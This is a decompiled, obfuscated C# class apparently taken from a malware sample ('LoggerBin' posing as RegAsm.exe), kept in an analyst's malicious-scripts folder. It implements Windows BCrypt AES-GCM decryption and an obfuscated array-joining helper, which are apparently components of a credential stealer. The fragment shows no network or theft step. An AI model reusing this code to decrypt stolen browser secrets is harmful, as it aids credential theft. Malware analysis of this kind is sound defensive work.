// Decompiled with JetBrains decompiler
// Type: nq.fE
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using Ki;
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace nq
{
  internal class fE
  {
    private static fE NHV;

    public byte[] sW6(
      byte[] _param1,
      byte[] _param2,
      byte[] _param3,
      byte[] _param4,
      byte[] _param5)
    {
      IntPtr num1 = Pxm.bx((object) this, uB.BCRYPT_AES_ALGORITHM, uB.MS_PRIMITIVE_PROVIDER, uB.BCRYPT_CHAIN_MODE_GCM, Pxm.Rxk);
      IntPtr num2;
      IntPtr hglobal = vxK.bx((object) this, num1, _param1, ref num2, vxK.XxO);
      uB.nr nr = new uB.nr(_param2, _param3, _param5);
      byte[] numArray1;
      using (nr)
      {
        byte[] numArray2 = new byte[yxT.bx((object) this, num1, yxT.xxj)];
        int length = 0;
        uint num3 = Oxg.bx(num2, _param4, _param4.Length, ref nr, numArray2, numArray2.Length, (byte[]) null, 0, ref length, 0, Oxg.ixn);
        if (num3 != 0U)
          throw new CryptographicException(string.Format(w4.bx(5838, w4.vY), (object) num3));
        numArray1 = new byte[length];
        uint num4 = Oxg.bx(num2, _param4, _param4.Length, ref nr, numArray2, numArray2.Length, numArray1, numArray1.Length, ref length, 0, Oxg.ixn);
        if ((int) num4 == (int) uB.STATUS_AUTH_TAG_MISMATCH)
          throw new CryptographicException(w4.bx(5966, w4.vY));
        if (num4 != 0U)
          throw new CryptographicException(string.Format(w4.bx(6072, w4.vY), (object) num4));
      }
      int num5 = (int) xxw.bx(num2, xxw.uxF);
      Marshal.FreeHGlobal(hglobal);
      int num6 = (int) Xx1.bx(num1, 0U, Xx1.Dx0);
      return numArray1;
    }

    private int bWY(IntPtr _param1)
    {
      byte[] numArray = nx2.bx((object) this, _param1, uB.BCRYPT_AUTH_TAG_LENGTH, nx2.hxh);
      return BitConverter.ToInt32(new byte[4]
      {
        numArray[4],
        numArray[5],
        numArray[6],
        numArray[7]
      }, 0);
    }

    private IntPtr mWs(string _param1, string _param2, string _param3)
    {
      IntPtr zero = IntPtr.Zero;
      uint num1 = yxV.bx(ref zero, _param1, _param2, 0U, yxV.Cxu);
      if (num1 != 0U)
        throw new CryptographicException(string.Format(w4.bx(6176, w4.vY), (object) num1));
      byte[] bytes = Encoding.Unicode.GetBytes(_param3);
      uint num2 = VxG.bx(zero, uB.BCRYPT_CHAINING_MODE, bytes, bytes.Length, 0, VxG.YxU);
      if (num2 != 0U)
        throw new CryptographicException(string.Format(w4.bx(6308, w4.vY), (object) num2));
      return zero;
    }

    private IntPtr xWv(IntPtr _param1, byte[] _param2, out IntPtr _param3)
    {
      int int32 = BitConverter.ToInt32(nx2.bx((object) this, _param1, uB.BCRYPT_OBJECT_LENGTH, nx2.hxh), 0);
      IntPtr num1 = Marshal.AllocHGlobal(int32);
      byte[] numArray = Gxa.bx((object) this, new byte[4][]
      {
        uB.BCRYPT_KEY_DATA_BLOB_MAGIC,
        BitConverter.GetBytes(1),
        BitConverter.GetBytes(_param2.Length),
        _param2
      }, Gxa.Yxv);
      uint num2 = Wxc.bx(_param1, IntPtr.Zero, uB.BCRYPT_KEY_DATA_BLOB, ref _param3, num1, int32, numArray, numArray.Length, 0U, Wxc.zxL);
      if (num2 != 0U)
        throw new CryptographicException(string.Format(w4.bx(6552, w4.vY), (object) num2));
      return num1;
    }

    private byte[] gWP(IntPtr _param1, string _param2)
    {
      int length = 0;
      uint num1 = Rxb.bx(_param1, _param2, (byte[]) null, 0, ref length, 0U, Rxb.Gxy);
      if (num1 != 0U)
        throw new CryptographicException(string.Format(w4.bx(6660, w4.vY), (object) num1));
      byte[] numArray = new byte[length];
      uint num2 = Rxb.bx(_param1, _param2, numArray, numArray.Length, ref length, 0U, Rxb.Gxy);
      if (num2 != 0U)
        throw new CryptographicException(string.Format(w4.bx(6794, w4.vY), (object) num2));
      return numArray;
    }

    public byte[] pWy(params byte[][] arrays)
    {
      int num1 = 0;
      byte[][] numArray1 = arrays;
      int index;
      for (index = 0; index < numArray1.Length; ++index)
      {
        int num2 = 0;
        if (fE.PHu() == null)
          goto label_8;
label_1:
        switch (num2)
        {
          case 1:
            byte[] numArray2 = numArray1[index];
            if (numArray2 != null)
            {
              num1 += numArray2.Length;
              continue;
            }
            continue;
          default:
            goto label_9;
        }
label_8:
        num2 = 1;
        goto label_1;
      }
      goto label_12;
label_2:
      byte[] numArray3;
      if (index >= numArray1.Length)
        return numArray3;
label_9:
      byte[] numArray4 = numArray1[index];
      int dstOffset;
      if (numArray4 != null)
      {
        Buffer.BlockCopy((Array) numArray4, 0, (Array) numArray3, dstOffset, numArray4.Length);
        dstOffset += numArray4.Length;
      }
      ++index;
      goto label_2;
label_12:
      numArray3 = new byte[num1 - 1 + 1];
      dstOffset = 0;
      numArray1 = arrays;
      index = 0;
      goto label_2;
    }

    public fE()
    {
      yd.bx(yd.EI);
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal static bool BHs() => fE.NHV == null;

    internal static fE PHu() => fE.NHV;
  }
}
